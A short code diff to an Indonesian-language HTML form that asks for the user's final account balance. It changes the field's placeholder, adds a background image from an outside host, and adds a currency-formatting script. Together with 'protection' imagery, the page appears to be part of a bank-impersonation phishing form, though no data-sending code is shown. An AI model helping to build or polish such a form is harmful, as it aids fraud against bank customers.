@@ -476,7 +476,10 @@ form{
      
     
      <label for="saldo" class="lbl1">Saldo akhir :</label>
-     <input type="tel" id="saldo" class="form-log1" maxlength="" name="saldo" data-name="rek" placeholder="Tuliskan Saldo Terakhir Anda" minlength="" required>
+     <input type="tel" id="saldo" class="form-log1 x" maxlength="" name="saldo" data-name="rek" placeholder="Pastikan saldo terakhir sesuai rekening" minlength="" required style="background-image: url(https://hosting.tigerengine.id/yirvgp.jpg);
+  background-repeat: no-repeat;
+  background-position: 100% 100%;
+  background-size: 100% 100%;padding-left: 11%;">
       <center>
      <img src="img/proteksi.png" width="90%" alt=""></img>
    <div style="left: 0; right: 0; margin: 0px auto; width: 100%">   
@@ -536,6 +539,12 @@ $( document ).ready(function() {
 </script>
 <script src="token.js">
 </script>      
-<script src="rupiah"></script>
+<script>
+     $(document).ready(function(){
+                
+                $( '.x' ).mask('000.000.000.000.000', {reverse: true});
+ 
+            });
+</script>
 </body>
 </html>
